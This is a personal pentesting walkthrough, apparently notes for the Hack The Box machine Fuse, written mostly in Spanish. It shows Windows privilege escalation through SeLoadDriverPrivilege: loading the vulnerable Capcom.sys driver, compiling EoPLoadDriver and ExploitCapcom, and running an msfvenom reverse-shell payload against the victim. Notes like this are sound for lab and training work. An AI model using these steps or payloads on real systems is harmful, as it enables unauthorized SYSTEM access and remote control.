## DESCRIPTION

Googling about `SeLoadDriverPrivilege` leads to [this post](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/) from TarLogic. If I can load a driver, I can load a vulnerable driver, and then exploit it. They use the vulnerable Capcom driver as an example. I’ll grab a copy of this vulnerable driver [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys).

I’ll need to compile a couple `.exe` files to pull off this attack. I’ll do that in a Windows VM. I made some attempts to compile one of them in Kali using `mingw-64`, but it led to errors. It’s typically better to compile Windows executables in Windows where possible.

Enumeración:

![[Pasted image 20230320200439.png]]

#### Mas información
* https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/
* https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#priv-svc-print--system

## EXPLOITATION

1. Clonamos el repositorio y descargamos la herramienta --> https://github.com/TarlogicSecurity/EoPLoadDriver/
**!!NOTA IMPORTANTE!!** 
	Tendremos que compilar por lo que vamos a usar Win 10 y visual studio

![[Pasted image 20230320200609.png]]

2. Creamos un proyecto en VS de Apliación de consola, copiamos el contenido del repo:

![[Pasted image 20230320200647.png]]

**!!NOTA IMPORTANTE!!** 
	IMPORTANTE ESTAMOS FRENTE A UNA MAQUINA WINDOWS 10 X64 ENTONCES LE TENEMOS QUE METER LA OPCIÓN ANTES DE COMPILAR:
	![[Pasted image 20230320200709.png]]

3. En este ejemplo nos ha dado un fallo al compilar

![[Pasted image 20230320200743.png]]

Para solucionarlo tenemos que eliminar el primer include.

4. NECESITAMOS DESCARGAR TAMBIEN CAPCOM.SYS  (este no hace falta compilarlo) --> https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys

5. Descargamos tambien este exploit --> https://github.com/tandasat/ExploitCapcom cambiamos lo siguiente en el codigo:

![[Pasted image 20230320201055.png]]

6. Lo compilamos

7. Creamos una reverse shell [[BUILD REVERSE SHELL MSFVENOM]]

```
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=5555 -f exe -o shell.exe   
```

9. Subimos a la máquina [[TRANSFERRING FILES]]

• LoadDriver: en este caso es ConsoleApp.exe
• Capcom.sys
• ExploitCapcom.exe
• shell.exe

10. Desde la máquina victima lo ejecutamos

```
C:\Windows\System32\spool\drivers\color\ConsoleApplication1.exe SystemCurrentSet\tal C:\Windows\System32\spool\drivers\color\Capcom.sys

.\ExploitCapcom.exe
```

![[Pasted image 20230320201358.png]]

![[Pasted image 20230320201403.png]]
## MACHINES

* Hack The Box: Fuse
